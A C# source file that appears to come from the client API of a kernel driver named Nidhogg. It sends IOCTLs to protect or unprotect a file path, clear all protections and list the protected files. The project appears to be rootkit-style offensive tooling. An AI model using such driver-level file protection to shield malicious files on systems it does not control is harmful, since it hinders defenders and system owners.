using System;
using System.Runtime.InteropServices;

namespace NidhoggCSharpApi
{
    internal partial class NidhoggApi
    {
        private NidhoggErrorCodes FileProtection(string filePath, bool protect)
        {
            ProtectedFile protectedFile;

            if (filePath.Length > MAX_PATH)
                return NidhoggErrorCodes.NIDHOGG_INVALID_INPUT;

            protectedFile = new ProtectedFile
            {
                FilePath = filePath,
                Protect = protect
            };

            return NidhoggSendDataIoctl(protectedFile, IOCTL_PROTECT_UNPROTECT_FILE);
        }

        public NidhoggErrorCodes FileProtect(string filePath)
        {
            return FileProtection(filePath, true);
        }

        public NidhoggErrorCodes FileUnprotect(string filePath)
        {
            return FileProtection(filePath, false);
        }

        public NidhoggErrorCodes FileClearAllProtection()
        {
            if (!DeviceIoControl(this.hNidhogg, IOCTL_CLEAR_FILE_PROTECTION,
                IntPtr.Zero, 0, IntPtr.Zero, 0, out uint _, IntPtr.Zero))
                return NidhoggErrorCodes.NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

            return NidhoggErrorCodes.NIDHOGG_SUCCESS;
        }

        public string[] QueryFiles()
        {
            FileItem currentFileItem;
            string[] files;
            int amountOfFiles;

            currentFileItem = new FileItem
            {
                FileIndex = 0
            };
            currentFileItem = NidhoggRecieveDataIoctl(currentFileItem, IOCTL_QUERY_FILES);
            amountOfFiles = currentFileItem.FileIndex;

            if (amountOfFiles == 0)
                return null;

            files = new string[amountOfFiles];
            files[0] = currentFileItem.FilePath.ToString();

            for (int i = 1; i < amountOfFiles; i++)
            {
                currentFileItem.FileIndex = i;
                currentFileItem = NidhoggRecieveDataIoctl(currentFileItem, IOCTL_QUERY_FILES);
                files[i] = currentFileItem.FilePath.ToString();
            }

            return files;
        }
    }
}